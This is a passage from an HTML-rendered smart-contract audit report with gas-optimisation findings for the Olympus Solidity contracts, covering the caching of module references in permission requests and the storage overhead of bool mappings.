class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setApprovalFor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserves</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mintOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>fix(similar for other policies):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">OlympusTreasury</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ltrsry</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">OlympusMinter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lmintr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ltrsry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lmintr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">requests</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ltrsry</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setApprovalFor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ltrsry</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserves</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lmintr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mintOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lmintr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79\">77-79</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">INSTR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">         </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk12\">transferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185\">172-185</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">173</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">9</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">updateCapacity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">updateMarket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">updatePrices</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">regenerate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setSpreads</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RANGE_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setThresholdFactor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">6</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setApprovalFor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">7</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mintOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">8</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnOhm</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/PriceConfig.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34\">32-34</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">initialize</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">changeMovingAverageDuration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">changeObservationFrequency</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/TreasuryCustodian.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39\">35-39</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">        </span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setApprovalFor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">        </span><span class=\"mtk12\">requests</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY_KEYCODE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">setDebt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<ul>\n<li>src/policies/VoterRegistration.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35\">33-35</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Permissions</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk12\">mintTo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">        </span><span class=\"mtk12\">permissions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Permissions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">KEYCODE</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"g-06--using-bools-for-storage-incurs-overhead-6-instances\" style=\"position:relative;\"><a href=\"#g-06--using-bools-for-storage-incurs-overhead-6-instances\" aria-label=\"g 06  using bools for storage incurs overhead 6 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06]  Using bools for storage incurs overhead (6 instances)</h2>\n<p>Deployment Gas Saved: <strong>23 611</strong><br>\nMethod Call Gas Saved: <strong>4 485</strong><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// word because each write operation emits an extra SLOAD to first read the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// pointer aliasing, and it cannot be disabled.</span></span></code></pre>\n<p>Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past.</p>\n<p><strong>Important</strong>: This rule doesn’t always work, sometimes a bool is packed with another variable in the same slot, sometimes it’s packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case.</p>\n<ul>\n<li>src/Kernel.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181\">181</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194\">194</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197\">197</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Keycode</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Policy</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">modulePermissions</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:3200 M:1754</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Role</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hasRole</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:−3016 M:2298</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Role</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isRole</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:2407</span></span></span></code></pre>\n<ul>\n<li>src/policies/Governance.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105\">105</a>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117\">117</a>,</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:3007</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">    </span><span 